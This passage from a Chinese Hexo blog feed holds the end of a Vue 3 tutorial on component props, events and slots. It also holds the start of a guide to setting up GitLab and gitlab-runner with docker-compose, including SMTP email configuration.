是子组件的属性，那上例会失效，父组件模板不应该知道子组件的状态，如果要绑定子组件内的指令应当这么做</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs javascript"><span class="hljs-keyword">const</span> <span class="hljs-title class_">SimpleCounter</span> = &#123;<br>    <span class="hljs-attr">template</span>: <span class="hljs-string">&quot;&lt;div v-show=&#x27;childProperty&#x27;&gt;1&lt;/div&gt;&quot;</span>,<br>    <span class="hljs-title function_">data</span>(<span class="hljs-params"></span>)&#123;<br>        <span class="hljs-keyword">return</span>&#123;<br>            <span class="hljs-attr">childProperty</span>: <span class="hljs-literal">true</span><br>        &#125;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><h2 id="构成组件"><a href="#构成组件" class="headerlink" title="构成组件"></a>构成组件</h2><p>组件意味着协同工作，通常父子组件会是这样的关系：</p><p>组件 A 在它的模板中使用了组件 B 。它们之间必然要相互通信</p><ul><li>父组件要给子组件传递数据，这个过程使用 <code>props</code> </li><li>子组件需要将它内部发生的事情告诉父组件，这个过程使用 <code>events</code></li></ul><h3 id="Props"><a href="#Props" class="headerlink" title="Props"></a>Props</h3><p>父组件可以使用 <code>props</code> 把数据传给子组件</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs html"><span class="hljs-tag">&lt;<span class="hljs-name">body</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">id</span>=<span class="hljs-string">&quot;mycomponent&quot;</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">child</span> <span class="hljs-attr">message</span>=<span class="hljs-string">&quot;parentmsg&quot;</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">child</span>&gt;</span><br>    <span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">body</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">script</span>&gt;</span><span class="language-javascript"></span><br><span class="language-javascript"><span class="hljs-keyword">const</span> child = &#123;</span><br><span class="language-javascript">        <span class="hljs-attr">props</span>: [<span class="hljs-string">&#x27;message&#x27;</span>],</span><br><span class="language-javascript">        <span class="hljs-attr">template</span>: <span class="hljs-string">&#x27;&lt;div&gt;&#123;&#123; message &#125;&#125;&lt;/div&gt;&#x27;</span></span><br><span class="language-javascript">    &#125;</span><br><span class="language-javascript"></span><br><span class="language-javascript">    <span class="hljs-keyword">const</span> mycomponent1 = <span class="hljs-title class_">Vue</span>.<span class="hljs-title function_">createApp</span>(&#123;</span><br><span class="language-javascript">        <span class="hljs-attr">components</span>: &#123;</span><br><span class="language-javascript">            <span class="hljs-string">&#x27;child&#x27;</span>: child</span><br><span class="language-javascript">        &#125;</span><br><span class="language-javascript">    &#125;).<span class="hljs-title function_">mount</span>(<span class="hljs-string">&quot;#mycomponent&quot;</span>)</span><br><span class="language-javascript"></span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span><br></code></pre></td></tr></table></figure><p>也可以使用 <code>v-bind</code> 动态绑定 <code>props</code> 的值到父组件的数据中。每当父组件的数据变化是，该变化也会传导给子组件</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><code class="hljs html"><span class="hljs-tag">&lt;<span class="hljs-name">body</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">id</span>=<span class="hljs-string">&quot;mycomponent&quot;</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">child</span> <span class="hljs-attr">:message</span>=<span class="hljs-string">&quot;parentmsg&quot;</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">child</span>&gt;</span><br>    <span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">body</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">script</span>&gt;</span><span class="language-javascript"></span><br><span class="language-javascript"><span class="hljs-keyword">const</span> child = &#123;</span><br><span class="language-javascript">        <span class="hljs-attr">props</span>: [<span class="hljs-string">&#x27;message&#x27;</span>],</span><br><span class="language-javascript">        <span class="hljs-attr">template</span>: <span class="hljs-string">&#x27;&lt;div&gt;&#123;&#123; message &#125;&#125;&lt;/div&gt;&#x27;</span></span><br><span class="language-javascript">    &#125;</span><br><span class="language-javascript"></span><br><span class="language-javascript">    <span class="hljs-keyword">const</span> mycomponent1 = <span class="hljs-title class_">Vue</span>.<span class="hljs-title function_">createApp</span>(&#123;</span><br><span class="language-javascript">        <span class="hljs-attr">components</span>: &#123;</span><br><span class="language-javascript">            <span class="hljs-string">&#x27;child&#x27;</span>: child</span><br><span class="language-javascript">        &#125;,</span><br><span class="language-javascript">        <span class="hljs-title function_">data</span>(<span class="hljs-params"></span>)&#123;</span><br><span class="language-javascript">            <span class="hljs-keyword">return</span> &#123;</span><br><span class="language-javascript">                <span class="hljs-attr">parentmsg</span>: <span class="hljs-string">&#x27;parent messsage&#x27;</span></span><br><span class="language-javascript">            &#125;</span><br><span class="language-javascript">        &#125;</span><br><span class="language-javascript">    &#125;).<span class="hljs-title function_">mount</span>(<span class="hljs-string">&quot;#mycomponent&quot;</span>)</span><br><span class="language-javascript"></span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span><br></code></pre></td></tr></table></figure><h3 id="Events"><a href="#Events" class="headerlink" title="Events"></a>Events</h3><p>子组件通过<code>$emit</code> 方法自定义触发一个事件来通知父组件完成相关操作，父组件就可以像处理原生 DOM 事件一样通过 <code>v-on</code> 或 <code>@</code> 监听子组件触发的事件</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><code class="hljs html"><span class="hljs-tag">&lt;<span class="hljs-name">body</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">id</span>=<span class="hljs-string">&quot;mycomponent&quot;</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">div</span>&gt;</span><br>            <span class="hljs-tag">&lt;<span class="hljs-name">child</span> </span><br><span class="hljs-tag">                <span class="hljs-attr">:message</span>=<span class="hljs-string">&quot;parentmsg&quot;</span> </span><br><span class="hljs-tag">                @<span class="hljs-attr">enlarge-text</span>=<span class="hljs-string">&quot;msgFontsize += 0.1&quot;</span>  </span><br><span class="hljs-tag">                <span class="hljs-attr">:style</span>=<span class="hljs-string">&quot;&#123; fontSize: msgFontsize + &#x27;em&#x27;&#125;&quot;</span>&gt;</span><br>            <span class="hljs-tag">&lt;/<span class="hljs-name">child</span>&gt;</span><br>        <span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span><br>    <span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">body</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">script</span>&gt;</span><span class="language-javascript"></span><br><span class="language-javascript"><span class="hljs-keyword">const</span> child = &#123;</span><br><span class="language-javascript">        <span class="hljs-attr">props</span>: [<span class="hljs-string">&#x27;message&#x27;</span>],</span><br><span class="language-javascript">        <span class="hljs-attr">emits</span>: [<span class="hljs-string">&#x27;enlargeText&#x27;</span>],</span><br><span class="language-javascript">        <span class="hljs-attr">template</span>: <span class="hljs-string">`</span></span><br><span class="hljs-string"><span class="language-javascript">                &lt;div&gt;</span></span><br><span class="hljs-string"><span class="language-javascript">                    &lt;h4&gt;&#123;&#123; message &#125;&#125;&lt;/h4&gt;</span></span><br><span class="hljs-string"><span class="language-javascript">                    &lt;button @click=&quot;$emit(&#x27;enlargeText&#x27;)&quot;&gt;</span></span><br><span class="hljs-string"><span class="language-javascript">                        Enlarge text</span></span><br><span class="hljs-string"><span class="language-javascript">                    &lt;/button&gt;</span></span><br><span class="hljs-string"><span class="language-javascript">                &lt;/div&gt;</span></span><br><span class="hljs-string"><span class="language-javascript">                `</span></span><br><span class="language-javascript">    &#125;</span><br><span class="language-javascript"></span><br><span class="language-javascript">    <span class="hljs-keyword">const</span> mycomponent1 = <span class="hljs-title class_">Vue</span>.<span class="hljs-title function_">createApp</span>(&#123;</span><br><span class="language-javascript">        <span class="hljs-attr">components</span>: &#123;</span><br><span class="language-javascript">            <span class="hljs-string">&#x27;child&#x27;</span>: child</span><br><span class="language-javascript">        &#125;,</span><br><span class="language-javascript">        <span class="hljs-title function_">data</span>(<span class="hljs-params"></span>)&#123;</span><br><span class="language-javascript">            <span class="hljs-keyword">return</span> &#123;</span><br><span class="language-javascript">                <span class="hljs-attr">parentmsg</span>: <span class="hljs-string">&#x27;parent messsage&#x27;</span>,</span><br><span class="language-javascript">                <span class="hljs-attr">msgFontsize</span>: <span class="hljs-number">1</span></span><br><span class="language-javascript">            &#125;</span><br><span class="language-javascript">        &#125;</span><br><span class="language-javascript">    &#125;).<span class="hljs-title function_">mount</span>(<span class="hljs-string">&quot;#mycomponent&quot;</span>)</span><br><span class="language-javascript"></span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span><br></code></pre></td></tr></table></figure><h4 id="使用事件抛出一个值"><a href="#使用事件抛出一个值" class="headerlink" title="使用事件抛出一个值"></a>使用事件抛出一个值</h4><p>有的时候用一个事件来抛出一个特定的值是非常有用的，这时可以使用 <code>$emit</code> 的第二个参数来提供这个值</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs html"><span class="hljs-tag">&lt;<span class="hljs-name">button</span> @<span class="hljs-attr">click</span>=<span class="hljs-string">&quot;$emit(&#x27;enlargeText&#x27;,0.1)&quot;</span>&gt;</span><br>Enlarge text<br><span class="hljs-tag">&lt;/<span class="hljs-name">button</span>&gt;</span><br></code></pre></td></tr></table></figure><p>然后在父组件监听时，可以通过 <code>$event</code> 访问到抛出的这个值</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs html"><span class="hljs-tag">&lt;<span class="hljs-name">child</span> @<span class="hljs-attr">enlarge-text</span>=<span class="hljs-string">&quot;onEnlargeText&quot;</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">child</span>&gt;</span><br></code></pre></td></tr></table></figure><p>或者，这个事件处理函数是一个方法</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs html"><span class="hljs-tag">&lt;<span class="hljs-name">child</span> @<span class="hljs-attr">enlarge-text</span>=<span class="hljs-string">&quot;onEnlargeText&quot;</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">child</span>&gt;</span><br></code></pre></td></tr></table></figure><p>那么这个值会作为第一个参数传入这个方法</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs javascript"><span class="hljs-attr">methods</span>: &#123;<br>    <span class="hljs-title function_">onEnlargeText</span>(<span class="hljs-params">enlargeAmount</span>)&#123;<br>        msgFontsize += enlargeAmount<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><h2 id="动态组件"><a href="#动态组件" class="headerlink" title="动态组件"></a>动态组件</h2><p>有时候，在不同组件之间进行动态切换是非常有用的（例如多标签的界面），这时可通过 Vue 的 <code>component</code> 元素加一个特殊的 <code>is</code> attribute 来实现</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs html"><span class="hljs-tag">&lt;<span class="hljs-name">component</span> <span class="hljs-attr">:is</span>=<span class="hljs-string">&quot;currentComponent&quot;</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">component</span>&gt;</span><br></code></pre></td></tr></table></figure><h2 id="通过插槽分发内容"><a href="#通过插槽分发内容" class="headerlink" title="通过插槽分发内容"></a>通过插槽分发内容</h2><p>使用 <code>&lt;slot&gt;</code> 作为我们想要插入内容的占位符，在其标签中的任何内容都会被视为备用内容，只有当父组件要插入的内容为空时显示</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><code class="hljs html"><span class="hljs-tag">&lt;<span class="hljs-name">body</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">id</span>=<span class="hljs-string">&quot;mycomponent&quot;</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">local-component-a</span>&gt;</span>There is a tiger.<span class="hljs-tag">&lt;/<span class="hljs-name">local-component-a</span>&gt;</span><br>    <span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">body</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">script</span>&gt;</span><span class="language-javascript"></span><br><span class="language-javascript"><span class="hljs-comment">//slot</span></span><br><span class="language-javascript">    <span class="hljs-keyword">const</span> <span class="hljs-title class_">ComponentA</span> = &#123;</span><br><span class="language-javascript">        <span class="hljs-attr">template</span>: <span class="hljs-string">`</span></span><br><span class="hljs-string"><span class="language-javascript">&lt;div&gt;</span></span><br><span class="hljs-string"><span class="language-javascript">                    &lt;strong&gt;Look Up!&lt;/strong&gt;</span></span><br><span class="hljs-string"><span class="language-javascript">                    &lt;slot&gt;&lt;/slot&gt;</span></span><br><span class="hljs-string"><span class="language-javascript">                    &lt;/div&gt;</span></span><br><span class="hljs-string"><span class="language-javascript">  `</span></span><br><span class="language-javascript">    &#125;</span><br><span class="language-javascript">    </span><br><span class="language-javascript">    <span class="hljs-keyword">const</span> mycomponent1 = <span class="hljs-title class_">Vue</span>.<span class="hljs-title function_">createApp</span>(&#123;</span><br><span class="language-javascript">        <span class="hljs-attr">components</span>: &#123;</span><br><span class="language-javascript">            <span class="hljs-string">&#x27;local-component-a&#x27;</span>: <span class="hljs-title class_">ComponentA</span></span><br><span class="language-javascript">        &#125;</span><br><span class="language-javascript">    &#125;).<span class="hljs-title function_">mount</span>(<span class="hljs-string">&quot;#mycomponent&quot;</span>)</span><br><span class="language-javascript"></span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span><br></code></pre></td></tr></table></figure><blockquote><p> 参考：<a href="https://github.com/DunkingCurry30/DunkingCurry30.github.io/blob/90f7ff1425262c84d2ee4043b2b29fb7dcd5e27c/source/code/Vue%E7%AC%94%E8%AE%B0/myVue.html">Vue示例</a></p></blockquote><h1 id="五、生命周期"><a href="#五、生命周期" class="headerlink" title="五、生命周期"></a>五、生命周期</h1><h2 id="图示"><a href="#图示" class="headerlink" title="图示"></a>图示</h2><p><img src="/../blog-assets/Vue%E7%AC%94%E8%AE%B0/lifecycle.svg" alt="https://v3.cn.vuejs.org/images/lifecycle.svg"></p>]]></content>
    
    
    <categories>
      
      <category>Web前端</category>
      
    </categories>
    
    
    <tags>
      
      <tag>vue</tag>
      
      <tag>js</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>docker 部署 gitlab gitlab-runner 实现 CI</title>
    <link href="/2022/06/08/Gitlab%E6%90%AD%E5%BB%BA%E5%8F%8A%E5%AE%9E%E7%8E%B0CI/"/>
    <url>/2022/06/08/Gitlab%E6%90%AD%E5%BB%BA%E5%8F%8A%E5%AE%9E%E7%8E%B0CI/</url>
    
    <content type="html"><![CDATA[<h1 id="GitLab私服搭建"><a href="#GitLab私服搭建" class="headerlink" title="GitLab私服搭建"></a>GitLab私服搭建</h1><p>GitLab 是一个用于仓库管理系统的开源项目，使用<a href="https://baike.baidu.com/item/Git">Git</a>作为代码管理工具，并在此基础上搭建起来的Web服务 </p><blockquote><p>参考官方Doc：  <a href="https://docs.gitlab.com/ee/install/docker.html">GitLab Docker images | GitLab</a> </p></blockquote><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-comment">#创建宿主机挂载目录</span><br><span class="hljs-built_in">mkdir</span> -p /data/docker/gitlab/&#123;config,data,logs&#125;<br></code></pre></td></tr></table></figure><p>在<code>/data/docker/gitlab/</code> 目录下创建 <code>docker-compose.yml</code> 文件，内容如下</p><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs yaml"><span class="hljs-attr">version:</span> <span class="hljs-string">&#x27;3.6&#x27;</span><br><span class="hljs-attr">services:</span><br>  <span class="hljs-attr">gitlab:</span><br>    <span class="hljs-attr">image:</span> <span class="hljs-string">&#x27;twang2218/gitlab-ce-zh&#x27;</span> <span class="hljs-comment">#这里使用twang团队的汉化社区版</span><br>    <span class="hljs-attr">container_name:</span> <span class="hljs-string">gitlab</span> <span class="hljs-comment"># 生成的docker容器的名字</span><br>    <span class="hljs-attr">restart:</span> <span class="hljs-string">always</span><br>    <span class="hljs-attr">environment:</span><br>      <span class="hljs-attr">GITLAB_OMNIBUS_CONFIG:</span> <span class="hljs-string">|</span><br><span class="hljs-string">        external_url &#x27;http://ip:8998&#x27; # 此处填写所在服务器ip若有域名可以写域名</span><br><span class="hljs-string">        gitlab_rails[&#x27;gitlab_shell_ssh_port&#x27;] = 2224</span><br><span class="hljs-string"></span>    <span class="hljs-attr">ports:</span><br>      <span class="hljs-bullet">-</span> <span class="hljs-string">&#x27;8998:8998&#x27;</span> <span class="hljs-comment"># 此处端口号须与 external_url 中保持一致，左边和右边都要一样</span><br>      <span class="hljs-bullet">-</span> <span class="hljs-string">&#x27;2224:22&#x27;</span> <span class="hljs-comment"># 这里的2224和上面的2224一致，但是右边必须是22，不能是其他</span><br>    <span class="hljs-attr">volumes:</span>     <span class="hljs-comment"># 目录映射（宿主机:容器内）</span><br>        <span class="hljs-bullet">-</span> <span class="hljs-string">./data:/var/opt/gitlab</span><br>        <span class="hljs-bullet">-</span> <span class="hljs-string">./logs:/var/log/gitlab</span><br>        <span class="hljs-bullet">-</span> <span class="hljs-string">./config:/etc/gitlab</span><br>    <span class="hljs-attr">shm_size:</span> <span class="hljs-string">&#x27;256m&#x27;</span><br></code></pre></td></tr></table></figure><p>执行<code>docker-compose</code> 命令，进行安装和容器启动，开通端口<code>8998</code> 和 <code>2224</code> 的防火墙</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">docker-compose up -d gitlab<br></code></pre></td></tr></table></figure><p>启动成功后，<code>ip:8998</code> 访问web端进行 Gitlab 设置新密码，使用<code>root</code> 账号登录进行使用</p><p><img src="/../blog-assets/Gitlab%E6%90%AD%E5%BB%BA%E5%8F%8A%E5%AE%9E%E7%8E%B0CI/1654501915699.png" alt="1654501915699"></p><h2 id="GitLab邮箱配置"><a href="#GitLab邮箱配置" class="headerlink" title="GitLab邮箱配置"></a>GitLab邮箱配置</h2><blockquote><p>前置条件：准备一个邮箱（以网易举例，需要在网易邮箱设置中开启 POP3&#x2F;SMTP 服务，获得授权码）</p></blockquote><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">vim /data/docker/gitlab/config/gitlab.rb<br></code></pre></td></tr></table></figure><p>修改<code>gitlab.rb</code> 的以下配置</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-comment">### GitLab email server settings</span><br>gitlab_rails[<span class="hljs-string">&#x27;smtp_enable&#x27;</span>] = <span class="hljs-literal">true</span><br>gitlab_rails[<span class="hljs-string">&#x27;smtp_address&#x27;</span>] = <span class="hljs-string">&quot;smtp.163.com&quot;</span><span class="hljs-comment">#网易邮箱发送服务器</span><br>gitlab_rails[<span class="hljs-string">&#x27;smtp_port&#x27;</span>] = 465<br>gitlab_rails[<span class="hljs-string">&#x27;smtp_user_name&#x27;</span>] = <span class="hljs-string">&quot;dunkingcurry30@163.com&quot;</span><span class="hljs-comment">#你的邮箱地址</span><br>gitlab_rails[<span class="hljs-string">&#x27;smtp_password&#x27;</span>] = <span class="hljs-string">&quot;xxxxxxxxx&quot;</span><span class="hljs-comment">#你的授权码</span><br>gitlab_rails[<span class="hljs-string">&#x27;smtp_domain&#x27;</span>] = <span class="hljs-string">&quot;smtp.163.com&quot;</span><br>gitlab_rails[<span class="hljs-string">&#x27;smtp_authentication&#x27;</span>] = <span class="hljs-string">&quot;login&quot;</span><br>gitlab_rails[<span class="hljs-string">&#x27;smtp_enable_starttls_auto&#x27;</span>] = <span class="hljs-literal">true</span><br>gitlab_rails[<span class="hljs-string">&#x27;smtp_tls&#x27;</span>] = <span class="hljs-literal">true</span><br><br><span class="hljs-comment">### Email Settings</span><br>gitlab_rails[<span class="hljs-string">&#x27;gitlab_email_enabled&#x27;</span>] = <span class="hljs-literal">true</span><br>gitlab_rails[<span class="hljs-string">&#x27;gitlab_email_from&#x27;</span>] = <span class="hljs-string">&#x27;dunkingcurry30@163.com&#x27;</span><span class="hljs-comment">#你的邮箱地址</span><br>gitlab_rails[<span class="hljs-string">&#x27;gitlab_email_display_name&#x27;</span>] = <span class="hljs-string">&#x27;GitLab&#x27;</span><br></code></pre></td></tr></table></figure><p>配置后，请删除镜像后重新用<code>docker-compose</code> 命令启动容器，启动成功后</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-comment">#通过portainer进入gitlab容器或者使用docker命令都可</span><br>docker <span class="hljs-built_in">exec</span> -it gitlab /bin/bash<br><span class="hljs-comment">#进入gitlab控制台</span><br>gitlab-rails console<br><span class="hljs-comment">#检查邮箱发送方式是否为smtp</span><br>ActionMailer::Base.delivery_method<br><span class="hljs-comment">#检查邮箱信息是否为设置的值</span><br>ActionMailer::Base.smtp_settings<br><br><span class="hljs-comment">#发送测试邮件，查看是否收到</span><br>Notify.test_email(<span class="hljs-string">&#x27;xxxxxxxxx@qq.com&#x27;</span>,<span class="hljs-string">&#x27;Hello World&#x27;</span>, <span class="hljs-string">&#x27;This is a test message&#x27;</span>).deliver_now<br></code></pre></td></tr></table></figure><h1 id="GitLab创建和拉取项目"><a href="#GitLab创建和拉取项目" class="headerlink" title="GitLab创建和拉取项目"></a>GitLab创建和拉取项目</h1><blockquote><ol><li>登录<code>GitLab</code> 创建项目 <code>myblog</code>  ，建议勾选创建 <code>README.md</code> ，创建完成后建议再新建一个<code>dev</code> 分支（因<code>GitLab</code> 默认 <code>master</code> 分支受保护，只能拉取无法推送）</li></ol></blockquote><p><img src="/../blog-assets/Gitlab%E6%90%AD%E5%BB%BA%E5%8F%8A%E5%AE%9E%E7%8E%B0CI/1654511863688.png" alt="1654511863688"></p><blockquote><ol start="2"><li>点击进入个人设置<code>SSH KEYS</code> ，添加本地 <code>id_rsa.pub</code> 公钥（公钥生成方式可参考<code>《基于hexo的个人博客搭建》</code> 中的 <code>配置本地git仓库</code> ）</li></ol></blockquote><p><img src="/../blog-assets/Gitlab%E6%90%AD%E5%BB%BA%E5%8F%8A%E5%AE%9E%E7%8E%B0CI/1654512220134.png" alt="1654512220134"></p><blockquote><ol start="3"><li>本地创建一个myblog目录，右键点击<code> git bash</code> 执行以下命令</li></ol></blockquote><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash">git config user.name 用户名<br>git config user.email 邮箱<br></code></pre></td></tr></table></figure><blockquote><ol start="4"><li>在 <code>GitLab</code> 项目页面获取 <code>ssh链接</code>，可使用 <code>git clone</code> 拉取项目，切换分支后使用 <code>git push</code> 命令推送（或使用vscode等IDE工具的插件对仓库进行操作）</li></ol></blockquote><p><img src="/../blog-assets/Gitlab%E6%90%AD%E5%BB%BA%E5%8F%8A%E5%AE%9E%E7%8E%B0CI/1654512603051.png" alt="1654512603051"></p><h1 id="GitLab-CI-自动化部署"><a href="#GitLab-CI-自动化部署" class="headerlink" title="GitLab-CI 自动化部署"></a>GitLab-CI 自动化部署</h1><blockquote><p><strong>1. 安装及注册 gitlab-runner</strong></p></blockquote><p>首先，安装 <code>gitlab-runner</code> </p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-comment"># 创建宿主机挂载目录</span><br><span class="hljs-built_in">mkdir</span> -p /data/docker/gitlab/gitlab-runner/config<br></code></pre></td></tr></table></figure><p>在创建的<code>config</code> 目录下创建文件<code>config.toml</code> ，内容如下</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs bash">concurrent = 1<br>check_interval = 0<br><br>[session_server]<br>  session_timeout = 1800<br></code></pre></td></tr></table></figure><p>在 GitLab 的 <code>docker-compose.yml</code> 中增加下列内容，注意缩进</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs bash">gitlab-runner:<br>    image: <span class="hljs-string">&#x27;gitlab/gitlab-runner&#x27;</span><br>    container_name: gitlab-runner<br>    restart: always<br>    volumes:<br>        - ./gitlab-runner/config:/etc/gitlab-runner <br></code></pre></td></tr></table></figure><p>执行<code>docker-compose</code> 命令，容器启动成功后注册 <code>runner</code> ，</p><p>其中，注册流程可参考： <a href="https://blog.csdn.net/weixin_39934640/article/details/110132281"> docker安装gitlab-runner自动化部署过程</a> </p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs bash">docker-compose up -d<br><span class="hljs-comment">#启动成功后，进入容器</span><br>docker <span class="hljs-built_in">exec</span> -it gitlab-runner bash<br><br><span class="hljs-comment"># 注册 runner</span><br>gitlab-runner register<br></code></pre></td></tr></table></figure><p>注册成功后，可在<code>GitLab—设置—CI/CD</code> 中查看 <code>runner</code> 状态是否可用</p><p><img 